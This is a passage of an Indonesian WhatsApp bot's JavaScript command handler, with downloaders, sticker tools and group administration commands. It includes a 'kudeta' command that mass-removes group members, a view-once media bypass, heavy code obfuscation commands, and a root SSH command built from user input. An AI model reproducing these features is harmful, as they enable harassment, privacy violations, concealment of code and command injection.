    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Skyzopedia/*^/*($break)*/" + 
            "/*Skyzopedia/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return m.reply(example("logo whatsapp"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://api.skyzopedia.us.kg/api/search/gimage?q=${text}`)
if (!res.status) return m.reply("Error")
let total = 0
let aray
if (res.result.length < 5) {
aray = res.result
} else {
aray = res.result.slice(0, 5)
}
for (let i of aray) {
await conn.sendMessage(m.chat, {image: {url: i.url}, caption: `Hasil pencarian foto ke ${total += 1}`}, {quoted: m})
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah SPNB-AI dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
if (!text) return m.reply(example('teksnya'))
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=false`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'skyzopedia.png');

let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'skyzopedia.png');
let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
let foto = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await conn.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await conn.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By SPNB-AI 🔥")
for (let i of memberFilter) {
await conn.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
